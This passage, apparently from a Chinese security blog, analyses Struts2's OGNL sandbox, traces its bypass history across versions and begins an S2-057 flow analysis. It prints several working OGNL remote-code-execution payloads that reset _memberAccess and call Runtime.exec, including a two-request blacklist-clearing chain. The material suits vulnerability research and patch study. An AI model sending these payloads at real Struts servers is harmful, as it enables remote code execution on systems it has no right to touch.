alt=""></p><p>可以看到设置根、设置安全防范措施、以及调用<code>Ognl.createDefaultContext</code>来创建默认的<code>Context</code>映射：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464848098458.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464848456067.jpg" alt=""></p><p>这里我们跟到<code>OgnlContext</code>中看一下，有这么几个对象时比较重要的，他们规定了OGNL计算中的计算规则处理类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464982871371.jpg" alt=""></p><ul><li><code>_root</code>：在OgnlContext内维护着的Root对象，它是OGNL主要的操作对象</li><li><code>_values</code>：如果希望在OGNL计算时使用传入的Map作为上下文环境，OGNL依旧会创建一个OgnlContext，并将所传入的Map中所有的键值对维护在<code>_values</code>变量中。这个变量就被看作真正的容器，并在OGNL的计算中发挥作用。</li><li><code>ClassResolver</code>：指定处理class loading的处理类。实际上这个处理类是用于指定OGNL在根据Class名称来构建对象时，寻找Class名称与对应的Class类之间对应关系的处理方式。在默认情况下会使用JVM的class.forName机制来处理。</li><li><code>TypeConverter</code>：指定处理类型转化的处理类。这个处理类非常关键，它会指定一个对象属性转化成字符串以及字符串转化成Java对象时的处理方式。</li><li><code>MemberAccess</code>：指定处理属性访问策略的处理方式。</li></ul><p>可以看到这里的<code>ClassResolver</code>是有关类的寻址以及调用的，也就是常说的所谓的执行。</p><h2 id="2-2-将现有的值和字段添加进ValueStack中（构造）"><a href="#2-2-将现有的值和字段添加进ValueStack中（构造）" class="headerlink" title="2.2 将现有的值和字段添加进ValueStack中（构造）"></a>2.2 将现有的值和字段添加进ValueStack中（构造）</h2><p>在初始化了<code>ValueStack</code>后，发现了后面的<code>container.inject(stack);</code>，这里是将依赖项注入现有的字段和方法，而在这个地方会调用<code>com.opensymphony.xwork2.ognl.OgnlValueStack$setOgnlUtil</code>将我们所关心的黑名单给添加进来：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469425702400.jpg" alt=""></p><p>然而其根本的作用是<strong>创建<code>_memberAccess</code></strong>。<br>这里可以注意到调用栈中首先是初始化了<code>ValueStack</code>之后再通过<code>OgnlUtil</code>这个API将数据和方法注入进<code>ValueStack</code>中，而<code>ValueStack</code>又是利用<code>OgnlContext</code>来创建的，所以会看到<code>OgnlContext</code>中的<strong><code>_memberAccess</code>与<code>securityMemberAccess</code>是同一个<code>SecurityMemberAccess</code>类的实例，而且内容相同，也就是说全局的<code>OgnlUtil</code>实例都共享着相同的设置。如果利用<code>OgnlUtil</code>更改了设置项（<code>excludedClasses</code>、<code>excludedPackageNames</code>、<code>excludedPackageNamePatterns</code>）则同样会更改<code>_memberAccess</code>中的值。</strong></p><p>这里可能不太好理解，可以看下面这几张图：</p><ol><li><p>首先<code>ValueStack</code>本身是个<code>OgnlContext</code></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470170533527.jpg" alt=""></p></li><li><p>之后调用<code>setOgnlUtil</code>添加黑名单：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469425702400.jpg" alt=""></p></li><li><p>然后<code>OgnlUtil</code>中的这些值赋给<code>SecurityMemberAccess</code>：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470167097980.jpg" alt=""></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470168699567.jpg" alt=""></p></li><li><p>也就是与<code>OgnlContext</code>中的<code>_memberAccess</code>建立关系，即创建了<code>_memberAccess</code>：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470176048468.jpg" alt=""></p></li></ol><p>而这一点在沙箱绕过时起到了很重要的作用。</p><h2 id="2-3-创建拦截器（Interceptor）"><a href="#2-3-创建拦截器（Interceptor）" class="headerlink" title="2.3 创建拦截器（Interceptor）"></a>2.3 创建拦截器（Interceptor）</h2><p>在之后当控制权转交给<code>ActionProxy</code>时会调用<code>OgnlUtil</code>作为操作OGNL的API，在创建拦截器（<code>Interceptor</code>）时会调用<code>com.opensymphony.xwork2.config.providers.InterceptorBuilder</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469435251224.jpg" alt=""></p><p>在这里利用工场函数来创建拦截器，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469435768671.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469447377180.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449020784.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449199402.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449399481.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15469449602034.jpg" alt=""></p><p>也就是把设置好的黑名单赋到<code>SecurityMemberAccess</code>中，在当前的上下文中用以检验表达式所调用的方法是否允许被调用。</p><h2 id="2-4-OGNL执行（利用反射调用）"><a href="#2-4-OGNL执行（利用反射调用）" class="headerlink" title="2.4 OGNL执行（利用反射调用）"></a>2.4 OGNL执行（利用反射调用）</h2><p>说完了初始化，再来说一下所谓的OGNL执行，在这里引用一下《Struts2技术内幕》这本书的一个表，这个表主要列举了OGNL计算时所需要遵循的一些重要的计算规则和默认实现类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464991029777.jpg" alt="-w768"></p><p>接下来就跟进<code>CompoundRootAccessor</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464991684892.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15465008912903.jpg" alt=""></p><p>在这里拓展了<code>ognl.DefaultClassResovler</code>，可以支持一些特殊的class名称。</p><h1 id="0x03-OGNL的攻防史"><a href="#0x03-OGNL的攻防史" class="headerlink" title="0x03 OGNL的攻防史"></a>0x03 OGNL的攻防史</h1><p>回看S2系列的漏洞，每当我们找到一个可以执行OGNL表达式的点在尝试构造恶意的OGNL时都会遇到这个防护机制，在我看了<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit" target="_blank" rel="noopener">lgtm</a>这篇文章后，我就想把围绕<code>SecurityMemberAccess</code>的攻防历史来全部梳理一遍。</p><p>可以说所有在对于OGNL的攻防全部都是基于如何使用静态方法。<code>Struts2</code>的防护措施从最开始的正则，到之后的黑名单，在保证OGNL强大功能的基础上，将可能执行静态方法的利用链给切断。在分析绕过方法时，需要注意的有这么几点：</p><ul><li><code>struts-defult.xml</code>中的黑名单</li><li><code>com.opensymphony.xwork2.ognl.SecurityMemberAccess</code></li><li><code>Ognl</code>包</li></ul><p>以下图例左边都是较为新的版本，右边为老版本。</p><h2 id="3-1-Struts-2-3-14-1版本前"><a href="#3-1-Struts-2-3-14-1版本前" class="headerlink" title="3.1 Struts 2.3.14.1版本前"></a>3.1 Struts 2.3.14.1版本前</h2><p>S2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于<code>SecurityMemberAccess</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470237734614.jpg" alt=""></p><p>左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改<code>allowStaticMethodAccess=true</code>，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true).(@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;))</span><br></pre></td></tr></table></figure><p>而在2.3.14.1版本后将<code>allowStaticMethodAccess</code>设置成final属性后，就不能显式更改了，这样的poc显然也失效了。</p><h2 id="3-2-Struts-2-3-20版本前"><a href="#3-2-Struts-2-3-20版本前" class="headerlink" title="3.2 Struts 2.3.20版本前"></a>3.2 Struts 2.3.20版本前</h2><p>在2.3.14.1后虽然不能更改<code>allowStaticMethodAccess</code>了，但是还是可以通过<code>_memberAccess</code>使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#p=new java.lang.ProcessBuilder(&apos;xcalc&apos;)).(#p.start())</span><br></pre></td></tr></table></figure><p>直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用<code>ProcessBuilder</code>这个payload了。</p><h2 id="3-3-Struts-2-3-29版本前"><a href="#3-3-Struts-2-3-29版本前" class="headerlink" title="3.3 Struts 2.3.29版本前"></a>3.3 Struts 2.3.29版本前</h2><p>左为2.3.29版本，右边为2.3.28版本</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15470227581652.jpg" alt=""></p><p>从黑名单中可以看到禁止使用了<code>ognl.MemberAccess</code>和<code>ognl.DefaultMemberAccess</code>，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用<code>_memberAccess</code>调用静态对象<code>DefaultMemberAccess</code>，然后用<code>DefaultMemberAccess</code>覆盖<code>_memberAccess</code>。那么为什么说这样就可以使用静态方法了呢？<br>我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(&apos;xcalc&apos;))</span><br></pre></td></tr></table></figure><p>我们来看一下<code>ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471036060838.jpg" alt=""></p><p>看过上一节的都知道，在程序运行时在<code>setOgnlUtil</code>方法中将黑名单等数据赋给<code>SecurityMemberAccess</code>，而这就是创建<code>_memberAccess</code>的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而<code>SecurityAccess</code>这个对象的父类本身就是<code>ognl.DefaultMemberAccess</code>，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类<code>DefaultMemberAccess</code>覆盖<code>_memberAccess</code>中的内容，就相当于初始化了<code>_memberAccess</code>，这样就可以绕过其之前所设置的黑名单以及限制条件。</p><h2 id="3-4-Struts-2-3-30-2-5-2"><a href="#3-4-Struts-2-3-30-2-5-2" class="headerlink" title="3.4 Struts 2.3.30+/2.5.2+"></a>3.4 Struts 2.3.30+/2.5.2+</h2><p>到了2.3.30(2.5.2)之后的版本，我们可以使用的<code>_memberAccess</code>和<code>DefaultMemberAccess</code>都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&apos;xcalc&apos;))</span><br></pre></td></tr></table></figure><p>可以看到绕过的关键点在于：</p><ul><li>利用Ognl执行流程利用<code>container</code>获取了<code>OgnlUtil</code>实例</li><li>清空了<code>OgnlUtil$excludedClasses</code>黑名单，释放了<code>DefaultMemberAccess</code></li><li>利用<code>setMemberAccess</code>覆盖</li></ul><p>而具体的流程可以参考2.2的内容。</p><h2 id="3-5-Struts-2-5-16"><a href="#3-5-Struts-2-5-16" class="headerlink" title="3.5 Struts 2.5.16"></a>3.5 Struts 2.5.16</h2><p>分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：</p><ul><li><p>2.5.13版本后禁止访问<code>coontext.map</code></p><p>  准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471155308956.jpg" alt=""></p><p>  而这个改变是在<code>OgnlContext</code>中：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471156088979.jpg" alt=""></p><p>  不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对<code>context.map</code>的访问。</p></li><li><p>2.5.20版本后<code>excludedClasses</code>不可变了，具体的代码在<a href="https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca" target="_blank" rel="noopener">这里</a></p></li></ul><p>所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。</p><p>文章提出了这么一种思路:</p><ul><li>没有办法使用<code>context.map</code>，可以调用<code>attr</code>，前文说过<code>attr</code>中保存着整个<code>context</code>的变量与方法，可以通过<code>attr</code>中的方法返回给我们一个<code>context.map</code>。</li><li>没有办法直接调用<code>excludedClasses</code>，也就不能使用<code>clear</code>方法来清空，但是还可以利用<code>setter</code>来把<code>excludedClasses</code>给设置成空</li><li>清空了黑名单，我们就可以利用<code>DefaultMemberAccess</code>来覆盖<code>_memberAccess</code>，来执行静态方法了。</li></ul><p>而这里又会出现一个问题，当我们使用<code>OgnlUtil</code>的<code>setExcludedClasses</code>和<code>setExcludedPackageNames</code>将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说<code>_memberAccess</code>是源数据的一个引用，就像前文所说的，在每次<code>createAction</code>时都是通过<code>setOgnlUtil</code>利用全局的源数据创建一个引用，这个引用就是一个<code>MemberAccess</code>对象，也就是<code>_memberAccess</code>。所以这里只会影响这次请求的<code>OgnlUtil</code>而并未重新创建一个新的<code>_memberAccess</code>对象，所以旧的<code>_memberAccess</code>对象仍未改变。</p><p>而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的<code>OgnlUitl</code>作为源重新创建一个<code>_memberAccess</code>，这样在第二次请求中<code>_memberAccess</code>就是黑名单被置空的情况，这个时候就释放了<code>DefaultMemberAccess</code>，就可以进行正常的覆盖以及执行静态方法。</p><p>poc为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(#context=#attr[&apos;struts.valueStack&apos;].context).(#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&apos;&apos;)).(#ognlUtil.setExcludedPackageNames(&apos;&apos;))</span><br><span class="line"></span><br><span class="line">(#context=#attr[&apos;struts.valueStack&apos;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&apos;curl 127.0.0.1:9001&apos;))</span><br></pre></td></tr></table></figure><p>需要发送两次请求：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471891401187.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471891816332.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471891957595.jpg" alt=""></p><h1 id="0x04-现阶段的OGNL"><a href="#0x04-现阶段的OGNL" class="headerlink" title="0x04 现阶段的OGNL"></a>0x04 现阶段的OGNL</h1><p>Struts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。</p><h2 id="4-1-2-5-17的改变（限制命名空间）"><a href="#4-1-2-5-17的改变（限制命名空间）" class="headerlink" title="4.1 2.5.17的改变（限制命名空间）"></a>4.1 2.5.17的改变（限制命名空间）</h2><ol><li><p>黑名单的变动，禁止访问<code>com.opensymphony.xwork2.ognl.</code></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471971431990.jpg" alt=""></p><p> 讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了<code>com.opensymphony.xwork2.ognl.</code>也就是说我们根本没办法访问这个Struts2重写的ognl包了。</p></li><li><p>切断了动态引用的方式，需要利用构造函数生成</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471974788040.jpg" alt=""><br>不谈重写了<code>setExcludedClasses</code>和<code>setExcludedPackageNamePatterns</code>，单单黑名单的改进就极大的限制了利用。</p></li></ol><h2 id="4-2-2-5-19的改进"><a href="#4-2-2-5-19的改进" class="headerlink" title="4.2 2.5.19的改进"></a>4.2 2.5.19的改进</h2><ol><li><p>ognl包的升级，从3.1.15升级到3.1.21</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471982817893.jpg" alt=""></p></li><li><p>黑名单改进</p><pre><code>![](http://image-lucifaer.test.upcdn.net/2019/01/16/15471983666584.jpg)</code></pre></li><li><p>在<code>OgnlUtil</code>中<code>setXWorkConverter</code>、<code>setDevMode</code>、<code>setEnableExpressionCache</code>、<code>setEnableEvalExpression</code>、<code>setExcludedClasses</code>、<code>setExcludedPackageNamePatterns</code>、<code>setExcludedPackageNames</code>、<code>setContainer</code>、<code>setAllowStaticMethodAccess</code>、<code>setDisallowProxyMemberAccess</code>都从public方法变成了protected方法了：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471986400847.jpg" alt=""></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471986545349.jpg" alt=""></p></li></ol><p>也就是说没有办法显式调用<code>setExcludedClasses</code>、<code>setExcludedPackageNamePatterns</code>、<code>setExcludedPackageNames</code>了。</p><h2 id="4-3-master分支的改变"><a href="#4-3-master分支的改变" class="headerlink" title="4.3 master分支的改变"></a>4.3 master分支的改变</h2><ol><li><p>ognl包的升级，从3.1.21升级到3.2.10，直接删除了<code>DefaultMemberAccess.java</code>，同时删除了静态变量<code>DEFAULT_MEMBER_ACCESS</code>，并且<code>_memberAccess</code>变成了final：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471994782111.jpg" alt=""></p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15471998270846.jpg" alt=""></p></li><li><p><code>SecurityMemberAccess</code>不再继承<code>DefaultMemberAccess</code>而直接转为<code>MemberAccess</code>接口的实现：</p><p> <img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15472003356029.jpg" alt=""></p></li></ol><p>可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，<code>DefaultAccess</code>彻底退出了历史舞台意味着利用父类覆盖<code>_memberAccess</code>的利用方式已经无法使用，而黑名单对于<code>com.opensymphony.xwork2.ognl</code>的限制导致我们基本上没有办法利用<code>Ognl</code>本身的API来更改黑名单，同时<code>_memberAccess</code>变为final属性也使得S2-057的这种利用<code>_memberAccess</code>暂时性的特征而进行“重放攻击”的方式测地化为泡影。</p><h2 id="4-4-总结"><a href="#4-4-总结" class="headerlink" title="4.4 总结"></a>4.4 总结</h2><p>Struts2随着其不断地发展，减少了原来框架的一部分灵活性而大大的增强了其安全性，如果按照master分支的改动趋势上看，以我的理解上来说，可以说现在基本上没得搞…</p><h1 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h1><ul><li><a href="https://cloud.tencent.com/developer/article/1024093" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1024093</a></li><li><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit</a></li><li>《Struts2技术内幕》</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在分析Struts2漏洞的过程中就一直想把OGNL的运行机制以及Struts2对OGNL的防护机制总结一下，但是一直苦于自己对Struts2的理解不是很深刻而迟迟无法动笔，最近看了&lt;a href=&quot;https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;lgtm的这篇文章&lt;/a&gt;收获良多，就想在这篇文章的基础上总结一下目前自己对于OGNL的一些理解，希望师傅们斧正。&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>S2-057（CVE-2018-11776）流程分析</title>
    <link href="https://lucifaer.com/2018/12/25/S2-057%EF%BC%88CVE-2018-11776%EF%BC%89%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/25/S2-057（CVE-2018-11776）流程分析/</id>
    <published>2018-12-25T08:45:00.000Z</published>
    <updated>2018-12-25T08:47:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>S2-057的流程分析，该漏洞不好利用，但是整个调用流程是非常值得去研究的，跟一边后基本上对Struts2的执行流程就非常清楚了，关于POC将在后面一篇文章具体说明。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><blockquote><p>Problem<br>It is possible to perform a RCE attack when alwaysSelectFullNamespace is true (either by user or a plugin like Convention Plugin) and then: namespace value isn’t set for a result defined in underlying configurations and in same time, its upper package configuration have no or wildcard namespace and same possibility when using url tag which doesn’t have value and action set and in same time, its upper package configuration have no or wildcard namespace.</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15452762673686.jpg" alt="-w1066"></p><p>从漏洞简述中可以看出漏洞在当应用设置<code>alwaysSelectFullNamespace</code>为<code>true</code>时有两种情况可以触发RCE：</p><ul><li>在xml配置中未设置<code>namespace</code>值，且上层包中未设置<code>namespace</code>或其未使用通配符所设置的<code>namespace</code>。</li><li>当使用未设置<code>value</code>和<code>action</code>值的<code>url</code>标签，且上层包中未设置<code>namespace</code>或其未使用通配符所设置的<code>namespace</code>。</li></ul><p>当然说啥都不如看diff来的更加直观，最直观的就是在<code>org.apache.struts2.dispatcher.mapper</code>中在<code>DefaultActionMapper</code>设置<code>namespace</code>时增添了对于<code>namespace</code>的校验：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15452769104052.jpg" alt=""></p><h1 id="0x01-调用流程分析"><a href="#0x01-调用流程分析" class="headerlink" title="0x01 调用流程分析"></a>0x01 调用流程分析</h1><p>从简述中我们看到比较关键的点是对<code>setNamespace</code>所设置的<code>namespace</code>进行了一次校验，那么漏洞可能就出现在这个地方。</p><p>而让我觉得比较好玩的地方就是我在找<code>mapping.setNamespace()</code>的调用栈时也同时找到了整条触发链以及ognl执行的点。我不知道其他的分析是如何在分析之初就可以准确定位到<code>org.com.opensymphony.xwork2.DefaultActionInvocation$executeResult</code>的，所以我想通过这一个diff出来的信息来找到整个漏洞的调用过程，以及解释为什么S2-057需要如此苛刻的条件。</p><p>漏洞修补的点在<code>parseNameAndNamespace</code>，也就是在<code>mapping.setNamespace()</code>前首先对<code>namespace</code>进行校验，校验这个<code>namespace</code>是否在<code>allowedActionNames</code>中。那么我们来顺着这个思路看一下<code>parseNameAndNamespace</code>的调用栈以及<code>mapping</code>的调用关系。</p><p><code>mapping</code>是一个<code>ActionMapping</code>实例，而<code>parseNameAndNamespace</code>的作用就是从URI中设置<code>ActionMapping</code>的<code>name</code>和<code>namespace</code>。现在知道了这个方法大致的调用栈和作用后，我们看一下哪里调用了这个方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453859651549.jpg" alt=""></p><p><code>getMapping()</code>调用了这个方法，我们跟进一下，看看这个方法干了点什么。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453861429673.jpg" alt=""></p><p>可以看到就是根据当前的请求和设置，生成该请求的<code>mapping</code>，这个<code>mapping</code>可以用来调用相关的<code>Action</code>，最后通过<code>ActionProxy</code>来根据<code>struts.xml</code>找到相应的<code>Action</code>，最后再通过<code>ActionProxy</code>来创建一个<code>ActionInvocation</code>实例来调用相应的拦截器。具体可以参考这张经典的图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453865907029.png" alt=""></p><p>ok，回到我们的漏洞，现在也就意味着我们需要跟到Struts2的运行流程中的<code>ActionMapper</code>流程这一块，来找哪里调用了<code>getMapping()</code>方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15453870168307.jpg" alt=""></p><p>接下来我们看一下<code>RepareOperations</code>的<code>findActionMapping</code>方法，该方法查询并选择性的创建<code>ActionMapping</code>是处于主运行流程中的一个方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456168239341.jpg" alt=""></p><p>可以看到这个方法有一个布尔变量<code>forceLoopup</code>，如果为true，则将会从<code>ActionMapper</code>实例中查找操作映射，并且该方法最后是返回一个<code>mapping</code>的，那么我们继续向上跟，看看哪里调用了此方法。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456171903019.jpg" alt=""></p><p>可以看到分别在准备Filter和执行Filter的过程中调用了<code>findActionMapping()</code>方法，从整个Struts的流程图中我们可以得知这两个调用点是在<code>ActionMapper</code>前后执行的，我们跟进<code>StrutsExecuteFilter</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456177055061.jpg" alt=""></p><p>可以看到这里校验mapping是否获取成功，如果获取成功，则执行<code>execute.executeAction()</code>跟进看一下这个方法具体的执行流：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456332434804.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456332905210.jpg" alt=""></p><p>可以看到最后将执行到<code>Dispatcer.serviceAction</code>中，而这个方法为指定的<code>Action</code>生成了<code>ActionProxy</code>，也就是Struts2整体运行流程中通过<code>FilterDispatcher</code>生成<code>ActionProxy</code>的过程。我们具体看一下当mapping中存在<code>getResult</code>的结果时，所执行的<code>proxy.execute()</code>。首先看一下<code>execute()</code>的继承关系：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456336520583.jpg" alt=""></p><p>跟进<code>StrutsActionProxy</code>看一下具体实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456338930595.jpg" alt=""></p><p>跟进<code>invoke()</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456343096327.jpg" alt=""></p><p>我们到<code>DefaultActionInvocation</code>来看一下<code>invoke()</code>的具体实现，代码很长，这里只截一部分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456344098802.jpg" alt=""></p><p>可以看到如果<code>ActionInvocation</code>如果并未执行的话，是通过<code>executeResult()</code>来执行的，跟进看一下具体的操作：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456350143484.jpg" alt=""></p><p>可以看到这里首先会调用<code>createResult()</code>获取相应的result对象，如果result不为null则执行<code>result.execute(this)</code>，这里的<code>execute()</code>是由具体的result对象实现的。我们看一下<code>execute()</code>的继承关系，来看看有多少地方是可以被我们调用的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456369414739.jpg" alt=""></p><p>根据<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">漏洞发现者的博客</a>所述以上红框所标注的类都是可以触发漏洞的点，我们选<code>ServletActionRedirectResult</code>这个类来看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456374576654.jpg" alt=""></p><p>注意到如果namespace不为null时，就会调用<code>namespace = conditionalParse(namespace, invocation);</code>，同时这段代码的关键性操作就是调用<code>setLocation()</code>对<code>tmpLocation</code>进行赋值，然后我们顺着<code>super</code>向上看：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456383794365.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456383883904.jpg" alt=""></p><p>而这里的location就是我们上面<code>setLocation()</code>所设置的<code>tmpLocation</code>，我们跟进<code>conditionalParse()</code>来看一下具体做了什么操作：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15456385837811.jpg" alt=""></p><p>看到了熟悉的<code>TextParseUtil.translateVariables</code>，而这里的<code>param</code>是<code>tmpLocation</code>，而<code>tmpLocation</code>是通过<code>getUriFromActionMapping</code>来设置的，而和<code>ActionMapping</code>是有关的，这样一来就绕了回来，也就是说我们如果构造了一个存在ognl表达式的namespace，那么最后这个namespace会被作为参数带入到<code>TextParseUtil.translateVariables()</code>中进行ognl表达式解析，并执行表达式。</p><h1 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h1><p>根据上面对于流程的分析，我们来梳理一下利用条件。</p><ul><li><p>我们需要在namespace中构造污点即包含ognl表达式，这需要我们自定义namespace，而这就需要我们在<code>default.properties</code>中设置<code>struts.mapper.alwaysSelectFullNamespace</code>为true，默认是为false的。</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15457076430046.jpg" alt=""></p></li></ul><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/25/15457076759724.jpg" 